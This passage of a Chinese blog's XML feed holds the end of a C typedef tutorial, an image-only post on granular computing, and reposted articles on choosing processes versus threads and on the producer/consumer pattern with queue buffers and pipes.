class="hljs-string">&quot;%d&quot;</span>,pstu1-&gt;score);<br>&#125;<br></code></pre></td></tr></table></figure><p>输出结果<code>99.5</code>。</p><p><strong>四、typedef的用法</strong></p><p>typedef相当于起外号的工具，在定义结构体变量时非常方便！</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">stu</span>&#123;</span><br>    <span class="hljs-keyword">char</span> name[<span class="hljs-number">20</span>];<br>    <span class="hljs-keyword">int</span> age;<br>&#125; Stu;<br></code></pre></td></tr></table></figure><p>如果没有<code>typedef</code>，我们定义结构体变量时，<code>struct stu student1；</code>还要如上操作。<br>但有了<code>typedef</code>，我们给<code>struct stu</code>起了一个外号<code>Stu</code>。如此一来，在定义结构体类型变量时，只需<code>Stu student1；</code>即可。</p>]]></content>
      
      
      <categories>
          
          <category> 计算机基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习 </tag>
            
            <tag> c/c++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>粒计算综述</title>
      <link href="/2021/07/17/%E7%B2%92%E8%AE%A1%E7%AE%97%E7%BB%BC%E8%BF%B0/"/>
      <url>/2021/07/17/%E7%B2%92%E8%AE%A1%E7%AE%97%E7%BB%BC%E8%BF%B0/</url>
      
        <content type="html"><![CDATA[<p><img src="/images/python/image-20210717010653229.png" alt="1"></p><p><img src="/images/python/image-20210717010720309.png" alt="2"></p><p><img src="/images/python/image-20210717010741790.png" alt="3"></p><p><img src="/images/python/image-20210717010804130.png" alt="4"></p><p><img src="/images/python/image-20210717010828552.png" alt="5"></p><p><img src="/images/python/image-20210717010854256.png" alt="6"></p><p><img src="/images/python/image-20210717010915094.png" alt="7"></p><p><img src="/images/python/image-20210717010939468.png" alt="8"></p><p><img src="/images/python/image-20210717011003325.png" alt="9"></p><p><img src="/images/python/image-20210717011024615.png" alt="10"></p><p><img src="/images/python/image-20210717011042868.png" alt="11"></p><p><img src="/images/python/image-20210717011101941.png" alt="12"></p><p><img src="/images/python/image-20210717011124041.png" alt="13"></p><p><img src="/images/python/image-20210717011144307.png" alt="14"></p><p><img src="/images/python/image-20210717011201756.png" alt="15"></p><p><img src="/images/python/image-20210717011217229.png" alt="16"></p><p><img src="/images/python/image-20210717011234076.png" alt="17"></p><p><img src="/images/python/image-20210717011251234.png" alt="18"></p><p><img src="/images/python/image-20210717011311325.png" alt="19"></p><p><img src="/images/python/image-20210717011338181.png" alt="20"></p><p><img src="/images/python/image-20210717011356447.png" alt="21"></p><p><img src="/images/python/image-20210717011449373.png" alt="22"></p><p><img src="/images/python/image-20210717011523167.png" alt="23"></p><p><img src="/images/python/image-20210717011550067.png" alt="24"></p><p><img src="/images/python/image-20210717011606498.png" alt="25"></p><p><img src="/images/python/image-20210717011624724.png" alt="26"></p><p><img src="/images/python/image-20210717011648260.png" alt="27"></p><p><img src="/images/python/image-20210717011729648.png" alt="28"></p><p><img src="/images/python/image-20210717011748062.png" alt="29"></p><p><img src="/images/python/image-20210717011832215.png" alt="30"></p><p><img src="/images/python/image-20210717011849804.png" alt="31"></p><p><img src="/images/python/image-20210717011906538.png" alt="32"></p><p><img src="/images/python/image-20210717011923942.png" alt="33"></p><p><img src="/images/python/image-20210717011938113.png" alt="34"></p><p><img src="/images/python/image-20210717012010059.png" alt="35"></p><p><img src="/images/python/image-20210717012032001.png" alt="36"></p><p><img src="/images/python/image-20210717012052637.png" alt="37"></p><p><img src="/images/python/image-20210717012108763.png" alt="38"></p>]]></content>
      
      
      <categories>
          
          <category> 人工智能 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习 </tag>
            
            <tag> 人工智能 </tag>
            
            <tag> 粒计算 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>架构设计：进程还是线程？</title>
      <link href="/2021/07/17/%E6%9E%B6%E6%9E%84%E8%AE%BE%E8%AE%A1%EF%BC%9A%E8%BF%9B%E7%A8%8B%E8%BF%98%E6%98%AF%E7%BA%BF%E7%A8%8B%EF%BC%9F/"/>
      <url>/2021/07/17/%E6%9E%B6%E6%9E%84%E8%AE%BE%E8%AE%A1%EF%BC%9A%E8%BF%9B%E7%A8%8B%E8%BF%98%E6%98%AF%E7%BA%BF%E7%A8%8B%EF%BC%9F/</url>
      
        <content type="html"><![CDATA[<h1 id="架构设计：进程还是线程？是一个问题！"><a href="#架构设计：进程还是线程？是一个问题！" class="headerlink" title="架构设计：进程还是线程？是一个问题！"></a>架构设计：进程还是线程？是一个问题！</h1><p><strong>文章目录</strong></p><p>★进程【颗粒度】问题<br>★“以业务逻辑为单元”划分进程的好处<br>★进程间通讯（以下简称 IPC）问题<br>★为啥还要线程？</p><p>　　就像莎士比亚的“To be, or not to be, that is the question”始终困扰着哈姆雷特，对于“进程还是线程？”这个问题，也经常困扰着那些进行软件架构设计的家伙。所以今天打算聊一下我对这个问题的体会。假如你还搞不清楚线程和进程的区别，请先找本操作系统原理的书好好拜读一下，再回来看帖。<br>由于这个问题很容易引发口水战，事先声明如下：多进程和多线程，无法一概而论地说谁比谁好。因此本帖主要描述<strong>特定场景</strong>（与我所负责的产品相关）下，进程和线程的权衡经验，仅供大伙儿参考。<br>　　由于特定场景是本帖讨论的前提，先说说我目前负责的产品的特点：业务逻辑比较复杂、业务数据量比较大、对数据<strong>实时</strong>处理的性能要求比较高、对健壮性和安全性要求比较高、要求跨平台（包括操作系统、数据库）、某些情况下需要分布部署。<br>　　上面说了一大堆，其实有不少的应用系统符合上述特点，比如：某些网络游戏服务器、某些金融行业的业务系统、某些电子商务的交易系统等等。如果你正在从事的是类似的应用系统的设计，希望我下面介绍的经验对你有帮助。</p><h2 id="★进程【颗粒度】问题"><a href="#★进程【颗粒度】问题" class="headerlink" title="★进程【颗粒度】问题"></a>★进程【颗粒度】问题</h2><p>　　大伙儿应该明白，进程和线程都是处理并发（concurrency）的手段。对于上述这种比较复杂的系统，如果你企图全部用进程（见“注1”）或者全部用线程（见“注2”）来处理并发，估计会死得很难看。所以，关键问题就是如何在进程和线程之间进行平衡（也就是确定进程颗粒度的问题）。<br>　　注1<br>　　所谓“全部用进程”，就是所有的并发都使用进程实现（因此每个进程只有一个线程）。这种设计在某些平台上（比如 Windows）会导致严重的性能问题。<br>　　注2<br>　　所谓“全部用线程”，就是所有的并发都使用线程实现（因此整个系统只有一个进程）。这种设计的健壮性极差（一个致命错会导致整个系统崩溃），而且更别提分布部署了。</p><p>　　我个人建议，尽量<strong>以业务逻辑的单元来划分进程</strong>。这样做的好处有如下几点：</p><h2 id="★“以业务逻辑为单元”划分进程的好处"><a href="#★“以业务逻辑为单元”划分进程的好处" class="headerlink" title="★“以业务逻辑为单元”划分进程的好处"></a>★“以业务逻辑为单元”划分进程的好处</h2><h3 id="◇避免扯皮"><a href="#◇避免扯皮" class="headerlink" title="◇避免扯皮"></a>◇避免扯皮</h3><p>　　一般来说，某个固定业务逻辑的开发人员也是相对固定的。如果业务逻辑对应的某个进程崩溃了，测试人员容易快速定位肇事者，然后直接提交Bug给他/她。<br>　　反之，一个进程搞得太庞大，N 多人掺和在里面，一旦进程崩溃了，相关编程人员之间很容易互相扯皮，不利于维护安定团结的局面；另外，由于测试人员经常搞不清楚 Bug 属于谁，经常给错 Bug，也容易制造人民内部矛盾。<br>　　由此可以看出，【相对细】的进程颗粒度能够避免一些管理上的麻烦。由于 XXX 经常教导我们：“稳定压倒一切”，所以该优点列第一条。</p><h3 id="◇健壮性、容错性"><a href="#◇健壮性、容错性" class="headerlink" title="◇健壮性、容错性"></a>◇健壮性、容错性</h3><p>　　一般来说，开发人员的水平参差不齐，优秀的毕竟是少数。所以难免会有菜鸟程序员搞出低级错误，而有些低级错误是致命的，会导致进程的崩溃。<br>　　如果你是以业务逻辑划分进程，一个业务逻辑的进程崩溃，对其它业务逻辑的影响不大（除非是该业务逻辑的依赖方）；因此就不会出现“全部用线程”导致的弊端。</p><h3 id="◇分布式"><a href="#◇分布式" class="headerlink" title="◇分布式"></a>◇分布式</h3><p>　　我常碰见的分布式部署需求，一般都是按照业务逻辑的维度来划分。比如系统中有一个认证模块，里面包含有敏感的用户认证信息。这时候客户就会要求把该模块单独部署在一台经过安全加固的主机中（以防阶级敌人搞破坏）。<br>　　如果是以业务逻辑为单位划分进程，要满足上述的部署需求就相对容易了（只要再配合恰当的进程间通讯机制，下面会提到）。<br>　　另外，支持分布式部署还可以顺带解决性能问题。比如某个业务逻辑模块特别消耗硬件资源（比如：内存、CPU、硬盘、带宽），就可以把它拿出去单独放一台机器上跑。</p><h3 id="◇跨编程语言"><a href="#◇跨编程语言" class="headerlink" title="◇跨编程语言"></a>◇跨编程语言</h3><p>　　这个好处可能很多人容易忽略。一般来说，每个编程语言都有各自的优缺点。如果你通过业务逻辑划分进程，就可以根据不同的业务逻辑的特点来选择合适的编程语言。<br>　　比如：对于性能敏感的模块，我就使用 C++ 搞定；而对于一些业务逻辑密集型的模块，则使用 Java 或 Python 开发。</p><h2 id="★进程间通讯（以下简称-IPC）问题"><a href="#★进程间通讯（以下简称-IPC）问题" class="headerlink" title="★进程间通讯（以下简称 IPC）问题"></a>★进程间通讯（以下简称 IPC）问题</h2><p>　　既然不可能把整个系统放入一个进程，那就必然会碰到 IPC 的问题。下面就来说一下该如何选择 IPC。<br>　　各种操作系统里面，有很多稀奇古怪的 IPC 类型。由于要考虑跨平台，首先砍掉一批（关于 IPC 的跨平台问题，我在“<a href="https://program-think.blogspot.com/2009/01/cxx-cross-platform-develop-0-overview.html">跨平台开发</a>”系列中会提到）。剩下的 IPC 类型中，能够进行数据传输的 IPC 就不多了，主要有如下几种：套接字（以下简称 Socket）、共享内存、管道、文件。<br>其中 Socket 是俺强烈推荐的 IPC 方式，理由如下：使用 Socket 可以天然地支持分布式部署；使用 Socket 可以比较容易地实现多种编程语言的混合（比如：C++、Java、Python、Flex 都支持 Socket）；使用 Socket 还可以省掉了一大坨“锁操作”的代码。<br>　　列位看官中，或许有人在担心 Socket 的性能问题，其实大可不必多虑。当两个进程在【本机】上进行 Socket 通讯时，由于可以使用 localhost 环回地址，数据不用经过物理网卡，操作系统内核还可以进行某些优化。这种情况下，Socket 相对其它几种IPC机制，不会有太大的性能偏差。<br>　　最后再补充一下，Socket 方式也可以有效防止扯皮问题。举个例子：张三写了一个进程 A，李四写了一个进程 B，进程 A 通过 Socket 方式发数据给进程B。突然有一天，两个进程的通讯出故障了。然后张三就说是李四接收数据出错；李四就说张三发送数据出错。这时候怎么办捏？很简单，随便找个 Sniffer 软件当场抓一下数据包并 Dump 出来看，问题就水落石出了。</p><h2 id="★为啥还要线程？"><a href="#★为啥还要线程？" class="headerlink" title="★为啥还要线程？"></a>★为啥还要线程？</h2><p>　　上面说了这么多进程的好处，有同学要问了：“那线程有什么用捏？”总的来说，使用线程出于两方面的考虑：性能因素和编码方便。</p><h3 id="◇性能因素"><a href="#◇性能因素" class="headerlink" title="◇性能因素"></a>◇性能因素</h3><p>　　由于某些操作系统（比如 Windows）中的进程比较重型，如果【频繁】创建进程或者创建大量进程，会导致操作系统的负载过高。举例如下：<br>　　假设你要开发一个类似 Web Server 的应用。你针对每一个客户端请求创建一个对应的进程用于进行数据交互（是不是想起了古老的 CGI）。一旦这个系统扩容，用户的并发连接数一增加，你的应用立马死翘翘。<br>　　上面的例子表明，跨平台软件系统的进程数要保持相对稳定。如果你的进程数会随着某些环境因素呈线性增长，那就相当不妙了（顺带说一下，如果线程数会随着环境因素呈线性增长，也相当不妙）。而根据业务逻辑的单元划分进程，顺便能达到“进程数的相对稳定”的效果。</p><h3 id="◇编码方面"><a href="#◇编码方面" class="headerlink" title="◇编码方面"></a>◇编码方面</h3><p>　　由于业务逻辑内部的数据耦合比较紧密。如果业务逻辑内部的并发也用进程来实现，<strong>可能</strong>会导致大量的 IPC 编码（任意两个进程之间只要有数据交互，就得写一坨 IPC 代码）。这或许会让相关的编程人员怨声载道。<br>　　当然，编码方面的问题也不是绝对的。假如你的系统有很成熟且方便易用的IPC库，可以比较透明地封装IPC相关操作，那这方面的问题也就不存在了。</p><p>　　写到这里，看看篇幅有点超，就此打住。大伙儿如有不同看法，请到评论中拍砖。</p>]]></content>
      
      
      <categories>
          
          <category> 经验分享 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 博客 </tag>
            
            <tag> programthink </tag>
            
            <tag> 小妙招 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>架构设计：生产者/消费者模式</title>
      <link href="/2021/07/17/%E6%9E%B6%E6%9E%84%E8%AE%BE%E8%AE%A1%EF%BC%9A%E7%94%9F%E4%BA%A7%E8%80%85-%E6%B6%88%E8%B4%B9%E8%80%85%E6%A8%A1%E5%BC%8F/"/>
      <url>/2021/07/17/%E6%9E%B6%E6%9E%84%E8%AE%BE%E8%AE%A1%EF%BC%9A%E7%94%9F%E4%BA%A7%E8%80%85-%E6%B6%88%E8%B4%B9%E8%80%85%E6%A8%A1%E5%BC%8F/</url>
      
        <content type="html"><![CDATA[<h1 id="架构设计：生产者-消费者模式-0-：概述"><a href="#架构设计：生产者-消费者模式-0-：概述" class="headerlink" title="架构设计：生产者/消费者模式[0]：概述"></a>架构设计：生产者/消费者模式[0]：概述</h1><p><strong>文章目录</strong></p><p>★简介<br>★优点<br>★本系列的目录</p><p>　　今天打算来介绍一下“生产者／消费者模式”，这玩意儿在很多开发领域都能派上用场。鉴于该模式很重要且相关内容比较丰富，俺打算分几个帖子逐一介绍。今天先来扫盲一把。如果你对这个模式已经比较了解，请跳过本帖子，直接看下一个帖子（关于如何确定数据单元）。<br>　　看到这里，可能有同学心中犯嘀咕了：在四人帮（Gang Of Four）的23种模式里面似乎没听说过这种嘛！其实 GOF 那经典的23种模式主要是基于 OO 的（从书名《Design Patterns: Elements of Reusable Object-Oriented Software》就可以看出来）。而 Pattern 实际上即可以是 OO 的 Pattern，也可以是非 OO 的 Pattern 的。</p><h2 id="★简介"><a href="#★简介" class="headerlink" title="★简介"></a>★简介</h2><p>　　言归正传！在实际的软件开发过程中，经常会碰到如下场景：某个模块负责产生数据，这些数据由另一个模块来负责处理（此处的<strong>模块</strong>是广义的，可以是类、函数、线程、进程等）。产生数据的模块，就形象地称为【生产者】；而处理数据的模块，就称为【消费者】。<br>　　单单抽象出生产者和消费者，还够不上是生产者／消费者模式。该模式还需要有一个缓冲区处于生产者和消费者之间，作为一个中介。生产者把数据放入缓冲区，而消费者从缓冲区取出数据。大概的结构如下图。</p><p><img src="https://lh4.googleusercontent.com/lwkhyGW9xUlynfMkTn8pkaBOyJx9U9H3sn_5r5_lkubIQzbyH4Lu8IVrvjQdh9DGH-txOF8ZgoLJRSgfFM7qTMa22dCQzwPBJNqbXASCz_2VvwVDmJGPCPcHR_xW7_fDLfcrn880" alt="不见图 请翻墙"></p><p>　　为了不至于太抽象，咱们举一个寄信的例子（虽说这年头寄信已经不时兴，但这个例子还是比较贴切的）。假设你要寄一封平信，大致过程如下：<br>1、你把信写好——相当于生产者制造数据<br>2、你把信放入邮筒——相当于生产者把数据放入缓冲区<br>3、邮递员把信从邮筒取出——相当于消费者把数据取出缓冲区<br>4、邮递员把信拿去邮局做相应的处理——相当于消费者处理数据</p><h2 id="★优点"><a href="#★优点" class="headerlink" title="★优点"></a>★优点</h2><p>　　可能有同学会问了：这个缓冲区有什么用捏？为什么不让生产者直接调用消费者的某个函数，直接把数据传递过去捏？搞出这么个缓冲区作甚？<br>　　其实这里面是大有讲究的，大概有如下一些好处。</p><h3 id="◇解耦"><a href="#◇解耦" class="headerlink" title="◇解耦"></a>◇解耦</h3><p>　　假设生产者和消费者分别是两个类。如果让生产者直接调用消费者的某个方法，那么生产者对于消费者就会产生依赖（也就是耦合）。将来如果消费者的代码发生变化，可能会影响到生产者。而如果两者都依赖于某个缓冲区，两者之间不直接依赖，耦合也就相应降低了。<br>　　接着上述的例子，如果不使用邮筒（也就是缓冲区），你必须得把信直接交给邮递员。有同学会说，直接给邮递员不是挺简单的嘛？其实不简单，你必须得认识谁是邮递员，才能把信给他（光凭身上穿的制服，万一有人假冒，就惨了）。这就产生和你和邮递员之间的依赖（相当于生产者和消费者的【强】耦合）。万一哪天邮递员换人了，你还要重新认识一下（相当于消费者变化导致修改生产者代码）。而邮筒相对邮递员来说比较固定，你依赖它的成本也就比较低（相当于和缓冲区之间的【弱】耦合）。</p><h3 id="◇支持并发（concurrency）"><a href="#◇支持并发（concurrency）" class="headerlink" title="◇支持并发（concurrency）"></a>◇支持并发（concurrency）</h3><p>　　生产者直接调用消费者的某个方法，还有另一个弊端。由于函数调用是同步的（或者叫阻塞的），在消费者的方法没有返回之前，生产者只好一直等在那边。万一消费者处理数据很慢，生产者就会白白糟蹋大好时光。<br>　　使用了生产者／消费者模式之后，生产者和消费者可以是两个独立的并发主体（常见的并发类型有进程和线程两种，后面的帖子会讲两种并发类型下的应用）。生产者把制造出来的数据往缓冲区一丢，就可以再去生产下一个数据。基本上不用依赖消费者的处理速度。<br>　　其实当初这个模式，主要就是用来处理并发问题的。<br>　　从寄信的例子来看。如果没有邮筒，你得拿着信傻站在路口等邮递员过来收（相当于生产者阻塞）；又或者邮递员得挨家挨户问，谁要寄信（相当于消费者轮询）。不管是哪种方法，都挺土的。</p><h3 id="◇支持忙闲不均"><a href="#◇支持忙闲不均" class="headerlink" title="◇支持忙闲不均"></a>◇支持忙闲不均</h3><p>　　缓冲区还有另一个好处。如果制造数据的速度时快时慢，缓冲区的好处就体现出来了。当数据制造快的时候，消费者来不及处理，未处理的数据可以暂时存在缓冲区中。等生产者的制造速度慢下来，消费者再慢慢处理掉。<br>　　为了充分复用、节省打字，俺再拿寄信的例子来说事儿。假设邮递员一次只能带走1000封信。万一某次碰上情人节（也可能是圣诞节）送贺卡，需要寄出去的信超过1000封，这时候邮筒这个缓冲区就派上用场了。邮递员把来不及带走的信暂存在邮筒中，等下次过来时再拿走。<br>　　费了这么多口水，希望原先不太了解生产者／消费者模式的同学能够明白它是怎么一回事。下一个帖子，首先聊一下“如何确定数据单元”。</p><h2 id="★本系列的目录"><a href="#★本系列的目录" class="headerlink" title="★本系列的目录"></a>★本系列的目录</h2><p>　　为了方便阅读，把本系列帖子的目录整理如下（需翻墙）：</p><ol><li><p>如何确定数据单元</p></li><li><p>队列缓冲区</p></li><li><p>环形缓冲区</p></li><li><p>双缓冲区</p></li></ol><h1 id="架构设计：生产者-消费者模式-1-：如何确定数据单元？"><a href="#架构设计：生产者-消费者模式-1-：如何确定数据单元？" class="headerlink" title="架构设计：生产者/消费者模式[1]：如何确定数据单元？"></a>架构设计：生产者/消费者模式[1]：如何确定数据单元？</h1><p><strong>文章目录</strong></p><p>★啥是数据单元？<br>★数据单元的特性</p><p>　　既然前文已经搞过扫盲了，那接下来应该开始聊一些具体的编程技术问题了。不过在进入具体的技术细节之前，咱们先要搞明白一个问题：如何确定数据单元？只有把数据单元分析清楚，后面的技术设计才好搞。</p><h2 id="★啥是数据单元？"><a href="#★啥是数据单元？" class="headerlink" title="★啥是数据单元？"></a>★啥是数据单元？</h2><p>　　何谓数据单元捏？简单地说，每次生产者放到缓冲区的，就是一个数据单元；每次消费者从缓冲区取出的，也是一个数据单元。对于前文中寄信的例子，我们可以把每一封单独的信件看成是一个数据单元。<br>　　不过光这么介绍，太过于简单，无助于大伙儿分析出这玩意儿。所以，后面咱们来看一下数据单元需要具备哪些特性。搞明白这些特性之后，就容易从复杂的业务逻辑中分析出适合做数据单元的东西了。</p><h2 id="★数据单元的特性"><a href="#★数据单元的特性" class="headerlink" title="★数据单元的特性"></a>★数据单元的特性</h2><p>　　分析数据单元，需要考虑如下几个方面的特性：</p><h3 id="◇关联到业务对象"><a href="#◇关联到业务对象" class="headerlink" title="◇关联到业务对象"></a>◇关联到业务对象</h3><p>　　首先，数据单元必须关联到某种业务对象。在考虑该问题的时候，你必须深刻理解当前这个生产者／消费者模式所对应的【业务逻辑】，才能够作出合适的判断。<br>　　由于“寄信”这个业务逻辑比较简单，所以大伙儿很容易就可以判断出数据单元是啥。但现实生活中，往往没这么乐观。大多数业务逻辑都比较复杂，当中包含的业务对象是层次繁多、类型各异。在这种情况下，就不易作出决策了。<br>　　虽说这一步有难度，但是很重要！如果选错了业务对象，会导致后续程序设计和编码实现的复杂度大为上升，增加了开发和维护成本。</p><h3 id="◇完整性"><a href="#◇完整性" class="headerlink" title="◇完整性"></a>◇完整性</h3><p>　　所谓完整性，就是在传输过程中，要保证该数据单元的完整。要么【整个】数据单元被传递到消费者，要么完全没有传递到消费者。不允许出现【部分】传递的情形。<br>　　对于寄信来说，你【不能】把半封信放入邮筒；同样的，邮递员从邮筒中拿信，也【不能】只拿出信的一部分。</p><h3 id="◇独立性"><a href="#◇独立性" class="headerlink" title="◇独立性"></a>◇独立性</h3><p>　　所谓独立性，就是各个数据单元之间没有互相依赖，某个数据单元传输失败【不应该】影响已经完成传输的单元；也【不能】影响尚未传输的单元。<br>　　为啥会出现传输失败捏？假如生产者的生产速度在一段时间内一直超过消费者的处理速度，那就会导致缓冲区不断增长并达到上限，之后就很不妙了（有些数据单元会被无情地抛弃）。如果数据单元相互独立，等到生产者的速度降下来之后，后续的数据单元继续处理，不会受到牵连；反之，如果数据单元之间有某种耦合，导致被丢弃的数据单元会影响到后续其它单元的处理，那就会使程序逻辑变得非常复杂。<br>　　对于寄信来说，某封信弄丢了，不会影响后续信件的送达；当然更不会影响已经送达的信件。</p><h3 id="◇颗粒度"><a href="#◇颗粒度" class="headerlink" title="◇颗粒度"></a>◇颗粒度</h3><p>　　前面提到，数据单元需要关联到某种业务对象。那么数据单元和业务对象是否要一一对应捏？很多场合确实是一一对应的。<br>　　不过，有时出于性能等因素的考虑，也可能会把N个业务对象打包成一个数据单元。那么，这个N该如何取值就是颗粒度的考虑了。颗粒度的大小是有讲究的。太大的颗粒度可能会浪费空间；太小的颗粒度可能会影响时间性能。颗粒度的权衡要基于多方面的因素，以及一些经验值的考量。<br>　　还是拿寄信的例子。如果颗粒度过小（比如设定为1），那邮递员每次只取出1封信。如果信件多了，那就得来回跑好多趟，浪费了时间。<br>　　如果颗粒度太大（比如设定为100），那寄信的人得等到凑满100封信才拿去放入邮筒。假如平时很少写信，就得等上很久，也不太爽。<br>　　可能有同学会问：生产者和消费者的颗粒度能否设置成不同大小（比如对于寄信人设置成1，对于邮递员设置成100）。当然，理论上可以这么干，但是在某些情况下会增加程序逻辑和代码实现的复杂度。后面讨论具体技术时，大伙儿应该能体会到数据单元的重要性。</p><p>　　好，数据单元的话题就说到这。希望通过本帖子，大伙儿能够搞明白数据单元到底是怎么一回事。下一个帖子，咱们来聊一下“基于队列的缓冲区”，技术上如何实现。</p><h1 id="架构设计：生产者-消费者模式-2-：队列缓冲区"><a href="#架构设计：生产者-消费者模式-2-：队列缓冲区" class="headerlink" title="架构设计：生产者/消费者模式[2]：队列缓冲区"></a>架构设计：生产者/消费者模式[2]：队列缓冲区</h1><p><strong>文章目录</strong></p><p>★线程方式<br>★进程方式</p><p>　　经过前面两个帖子的铺垫，今天终于开始聊一些具体的编程技术了。由于不同的缓冲区类型、不同的并发场景对于具体的技术实现有较大的影响。为了深入浅出、便于大伙儿理解，咱们先来介绍最传统、最常见的方式。也就是单个生产者对应单个消费者，当中用【队列】（FIFO）作缓冲。</p><h2 id="★线程方式"><a href="#★线程方式" class="headerlink" title="★线程方式"></a>★线程方式</h2><p>　　先来说一下并发线程中使用队列的例子，以及相关的优缺点。</p><h3 id="◇内存分配的性能"><a href="#◇内存分配的性能" class="headerlink" title="◇内存分配的性能"></a>◇内存分配的性能</h3><p>　　在线程方式下，生产者和消费者各自是一个线程。生产者把数据写入队列头（以下简称 push），消费者从队列尾部读出数据（以下简称 pop）。当队列为空，消费者就稍息（稍事休息）；当队列满（达到最大长度），生产者就稍息。整个流程并不复杂。<br>　　那么，上述过程会有什么问题捏？一个主要的问题是关于内存分配的性能开销。对于常见的队列实现：在每次 push 时，可能涉及到【堆内存】的分配；在每次 pop 时，可能涉及【堆内存】的释放。假如生产者和消费者都很勤快，频繁地 push、pop，那内存分配的开销就很可观啦！对于内存分配的开销，用 Java 的同学可以参见前几天的帖子“[Java 性能优化<a href="https://program-think.blogspot.com/2009/03/java-performance-tuning-1-two-types.html">1]</a>”；对于用 C/C++ 的同学，想必对 OS 底层机制会更清楚，应该知道分配【堆内存】（new 或 malloc）会有加锁的开销和<a href="https://en.wikipedia.org/wiki/Context_switch#User_and_kernel_mode_switching">用户态/核心态切换</a>的开销。<br>　　那该怎么办捏？请听下文分解，关于“生产者/消费者模式[3]：环形缓冲区”。</p><h3 id="◇同步和互斥的性能"><a href="#◇同步和互斥的性能" class="headerlink" title="◇同步和互斥的性能"></a>◇同步和互斥的性能</h3><p>　　另外，由于两个线程共用一个队列，自然就会涉及到线程间诸如同步啊、互斥啊、死锁啊等等劳心费神的事情。好在”操作系统”这门课程对此有详细介绍，学过的同学应该还有点印象吧？对于没学过这门课的同学，也不必难过，网上相关的介绍挺多的（比如“<a href="https://en.wikipedia.org/wiki/Producer-consumer_problem">这里</a>”），大伙自己去瞅一瞅。关于这方面的细节，咱今天就不多啰嗦了。<br>　　这会儿要细谈的是，同步和互斥的性能开销。在很多场合中，诸如信号量、互斥量等玩意儿的使用也是有不小的开销的（某些情况下，也可能导致用户态/核心态切换）。如果像刚才所说，生产者和消费者都很勤快，那这些开销也不容小觑啊。<br>　　这又该咋办捏？请听下文的下文分解，关于“生产者/消费者模式[4]：双缓冲区”。</p><h3 id="◇适用于队列的场合"><a href="#◇适用于队列的场合" class="headerlink" title="◇适用于队列的场合"></a>◇适用于队列的场合</h3><p>　　刚才尽批判了队列的缺点，难道队列方式就一无是处？非也。由于队列是很常见的数据结构，大部分编程语言都内置了队列的支持（具体介绍见“<a href="https://en.wikipedia.org/wiki/Deque">这里</a>”），有些语言甚至提供了线程安全的队列（比如JDK 1.5引入的 <a href="http://java.sun.com/j2se/1.5.0/docs/api/java/util/concurrent/ArrayBlockingQueue.html">ArrayBlockingQueue</a>）。因此，开发人员可以捡现成，避免了重新发明轮子。<br>　　所以，假如你的数据流量不是很大，采用队列缓冲区的好处还是很明显的：逻辑清晰、代码简单、维护方便。比较符合 <a href="https://en.wikipedia.org/wiki/KISS_principle">KISS 原则</a>。</p><h2 id="★进程方式"><a href="#★进程方式" class="headerlink" title="★进程方式"></a>★进程方式</h2><p>　　说完了线程的方式，再来介绍基于进程的并发。<br>　　跨进程的生产者／消费者模式，非常依赖于具体的进程间通讯（IPC）方式。而IPC的种类名目繁多，不便于挨个列举（毕竟口水有限）。因此咱们挑选几种跨平台、且编程语言支持较多的IPC方式来说事儿。</p><h3 id="◇匿名管道"><a href="#◇匿名管道" class="headerlink" title="◇匿名管道"></a>◇匿名管道</h3><p>　　感觉管道是最像队列的IPC类型。生产者进程在管道的<strong>写端</strong>放入数据；消费者进程在管道的<strong>读端</strong>取出数据。整个的效果和线程中使用队列非常类似，区别在于使用管道就无需操心线程安全、内存分配等琐事（操作系统暗中都帮你搞定了）。<br>　　管道又分“<a href="https://en.wikipedia.org/wiki/Named_pipe">命名管道</a>”和“<a href="https://en.wikipedia.org/wiki/Anonymous_pipe">匿名管道</a>”两种，今天主要聊匿名管道。因为命名管道在不同的操作系统下差异较大（比如 Win32 和 POSIX，在命名管道的 API 接口和功能实现上都有较大差异；有些平台不支持命名管道，比如 Windows CE）。除了操作系统的问题，对于有些编程语言（比如 Java）来说，命名管道是无法使用的。所以俺一般不推荐使用这玩意儿。<br>　　其实匿名管道在不同平台上的 API 接口，也是有差异的（比如 Win32 的 CreatePipe 和 POSIX 的 pipe，用法就很不一样）。但是我们可以仅使用标准输入和标准输出（以下简称 stdio）来进行数据的流入流出。然后利用 shell 的管道符把生产者进程和消费者进程关联起来（没听说过这种手法的同学，可以看“<a href="https://en.wikipedia.org/wiki/Pipeline_(Unix)">这里</a>”）。实际上，很多操作系统（尤其是 POSIX 风格的）自带的命令都充分利用了这个特性来实现数据的传输（比如 more、grep 等）。<br>　　这么干有如下几个好处：<br>\1. 基本上所有操作系统都支持在 shell 方式下使用管道符。因此很容易实现跨平台。<br>\2. 大部分编程语言都能够操作 stdio，因此跨编程语言也就容易实现。<br>\3. 刚才已经提到，管道方式省却了线程安全方面的琐事。有利于降低开发、调试成本。</p><p>当然，这种方式也有自身的缺点：<br>\1. 生产者进程和消费者进程必须得在同一台主机上，无法跨机器通讯。这个缺点比较明显。<br>\2. 在一对一的情况下，这种方式挺合用。但如果要扩展到一对多或者多对一，那就有点棘手了。所以这种方式的扩展性要打个折扣。假如今后要考虑类似的扩展，这个缺点就比较明显。<br>\3. 由于管道是 shell 创建的，对于两边的进程不可见（程序看到的只是 stdio）。在某些情况下，导致程序不便于对管道进行操纵（比如调整管道缓冲区尺寸）。这个缺点不太明显。<br>\4. 最后，这种方式只能单向传数据。好在大多数情况下，消费者进程不需要传数据给生产者进程。万一你确实需要信息反馈（从消费者到生产者），那就费劲了。可能得考虑换种 IPC 方式。</p><p>　　顺便补充几个注意事项，大伙儿留意一下：<br>\1. 对 stdio 进行读写操作是以阻塞方式进行。比如管道中没有数据，消费者进程的读操作就会一直停在哪儿，直到管道中重新有数据。<br>\2. 由于 stdio 内部带有自己的缓冲区（这缓冲区和管道缓冲区是两码事），有时会导致一些不太爽的现象（比如生产者进程输出了数据，但消费者进程没有<strong>立即</strong>读到）。具体的细节，大伙儿可以看”<a href="http://www.pixelbeat.org/programming/stdio_buffering/">这篇文章</a>“。</p><h3 